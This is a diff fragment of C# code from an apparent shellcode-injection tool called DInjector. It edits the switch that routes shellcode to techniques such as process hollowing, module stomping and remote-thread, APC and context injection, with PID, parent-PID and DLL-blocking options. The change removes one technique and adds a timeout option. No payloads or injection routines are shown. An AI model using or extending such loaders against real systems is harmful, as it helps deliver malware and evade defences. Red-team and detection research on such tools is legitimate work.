@@ -154,48 +154,65 @@ namespace DInjector
                     case "functionpointer":
                         FunctionPointer.Execute(shellcodeBytes);
                         break;
+
                     case "functionpointerunsafe":
                         FunctionPointerUnsafe.Execute(shellcodeBytes);
                         break;
-                    case "msiladdressleak":
-                        MSILAddressLeak.Execute(shellcodeBytes);
-                        break;
+
                     case "clipboardpointer":
                         ClipboardPointer.Execute(shellcodeBytes);
                         break;
+
                     case "currentthread":
-                        CurrentThread.Execute(shellcodeBytes);
+                        uint timeout = 0;
+                        try
+                        {
+                            timeout = uint.Parse(options["/timeout"]);
+                        }
+                        catch (Exception)
+                        { }
+
+                        CurrentThread.Execute(
+                            shellcodeBytes,
+                            timeout);
                         break;
+
                     case "currentthreaduuid":
                         string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                         CurrentThreadUuid.Execute(shellcodeUuids);
                         break;
+
                     case "remotethread":
                         RemoteThread.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]));
                         break;
+
                     case "remotethreaddll":
                         RemoteThreadDll.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
                             options["/dll"]);
                         break;
+
                     case "remotethreadview":
                         RemoteThreadView.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]));
                         break;
+
                     case "remotethreadsuspended":
                         RemoteThreadSuspended.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]));
                         break;
+
                     case "remotethreadkernelcb":
                         RemoteThreadKernelCB.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]));
                         break;
+
                     case "remotethreadapc":
                         RemoteThreadAPC.Execute(
                             shellcodeBytes,
@@ -203,6 +220,7 @@ namespace DInjector
                             ppid,
                             blockDlls);
                         break;
+
                     case "remotethreadcontext":
                         RemoteThreadContext.Execute(
                             shellcodeBytes,
@@ -210,6 +228,7 @@ namespace DInjector
                             ppid,
                             blockDlls);
                         break;
+
                     case "processhollowing":
                         ProcessHollowing.Execute(
                             shellcodeBytes,
@@ -217,6 +236,7 @@ namespace DInjector
                             ppid,
                             blockDlls);
                         break;
+
                     case "modulestomping":
                         ModuleStomping.Execute(
                             shellcodeBytes,
